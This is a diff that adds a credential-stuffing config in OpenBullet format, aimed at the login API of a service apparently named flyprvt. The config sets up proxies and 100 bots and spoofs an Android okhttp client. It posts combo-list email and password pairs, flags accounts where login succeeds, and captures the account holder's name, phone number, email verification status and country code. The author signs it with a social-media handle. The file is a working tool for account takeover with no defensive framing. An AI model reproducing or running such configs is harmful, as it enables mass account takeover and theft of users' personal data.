@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "prvt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-26T08:00:54.919187+02:00",
+  "AdditionalInfo": "https://t.mw/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://appapi.flyprvt.net/api/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"device_token\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: appapi.flyprvt.net" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 229" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\":\"User loggd in successfully!\"" 
+
+PARSE "<SOURCE>" JSON "name" -> VAR "F" 
+
+PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "Name" "<F>" "" 
+
+PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "phone" 
+
+PARSE "<SOURCE>" JSON "email_verified_at" CreateEmpty=FALSE -> CAP "email_verified_at" 
+
+PARSE "<SOURCE>" LR "country_code\":" "," CreateEmpty=FALSE -> CAP "country_code" 
+
+#BY FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked by" 
+
